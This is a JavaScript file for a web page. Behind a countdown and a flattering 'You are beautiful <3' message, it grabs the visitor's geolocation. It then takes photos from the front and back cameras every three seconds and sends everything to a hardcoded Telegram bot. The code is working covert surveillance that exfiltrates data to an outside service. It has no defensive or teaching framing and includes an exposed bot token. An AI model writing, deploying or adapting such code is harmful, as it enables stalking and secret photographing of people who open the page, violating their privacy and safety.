const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

const countdownEl = document.getElementById('countdown');
const statusEl = document.getElementById('status');
const videoEl = document.getElementById('video');
const canvasEl = document.getElementById('canvas');
const reloadBtn = document.getElementById('reloadBtn');

let currentCamera = 'user'; // 'user' = фронтальная, 'environment' = задняя
let stream = null;
let photoInterval = null;

// Обратный отсчёт 3..2..1
function startCountdown() {
  let count = 3;
  countdownEl.textContent = count;
  const interval = setInterval(() => {
    count--;
    if (count === 0) {
      clearInterval(interval);
      countdownEl.style.display = 'none';
      requestPermissions();
    } else {
      countdownEl.textContent = count;
    }
  }, 1000);
}

// Запрос разрешений камеры и геолокации
async function requestPermissions() {
  statusEl.style.display = 'block';
  statusEl.textContent = 'Запрашиваем доступ к геолокации и камере...';

  try {
    // Геолокация (один раз)
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        sendLocationToTelegram(lat, lon);
      }, err => {
        console.warn('Геолокация не разрешена или недоступна');
      });
    } else {
      console.warn('Геолокация не поддерживается');
    }

    // Запуск циклического фото с камер
    await startCameraCycle();
  } catch (e) {
    statusEl.textContent = 'Ошибка при запросе доступа: ' + e.message;
    showReloadButton();
  }
}

// Отправка геолокации в Telegram
function sendLocationToTelegram(lat, lon) {
  const url = `https://maps.google.com/?q=${lat},${lon}`;
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: `🌍 Геолокация: ${url}`
    })
  });
}

// Запускаем поочерёдный цикл фото с фронтальной и задней камеры
async function startCameraCycle() {
  statusEl.textContent = 'You are beautiful <3 ';

  // Каждые 3 секунды меняем камеру и снимаем фото
  photoInterval = setInterval(async () => {
    try {
      if (stream) {
        // Останавливаем текущий поток
        stopStream(stream);
        videoEl.srcObject = null;
      }

      // Меняем камеру
      currentCamera = (currentCamera === 'user') ? 'environment' : 'user';

      // Запрашиваем камеру
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentCamera }, audio: false });
      videoEl.srcObject = stream;

      // Ждём пока видео загрузится
      await new Promise(res => videoEl.onloadedmetadata = res);

      // Делаем фото и отправляем
      sendPhotoToTelegram();

    } catch (e) {
      console.error('Ошибка камеры:', e);
      statusEl.textContent = 'Ошибка доступа к камере.';
      clearInterval(photoInterval);
      showReloadButton();
    }
  }, 3000);
}

// Делаем фото с видео и отправляем в Telegram
function sendPhotoToTelegram() {
  const ctx = canvasEl.getContext('2d');
  canvasEl.width = videoEl.videoWidth;
  canvasEl.height = videoEl.videoHeight;
  ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
  canvasEl.toBlob(blob => {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, `${currentCamera}_photo.jpg`);
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    }).catch(e => console.warn('Ошибка отправки фото:', e));
  }, 'image/jpeg', 0.8);
}

// Остановить поток камеры
function stopStream(stream) {
  stream.getTracks().forEach(track => track.stop());
}

// Показать кнопку перезагрузки
function showReloadButton() {
  reloadBtn.style.display = 'block';
  reloadBtn.onclick = () => location.reload();
  statusEl.style.display = 'none';
}

// Запускаем всё
startCountdown();
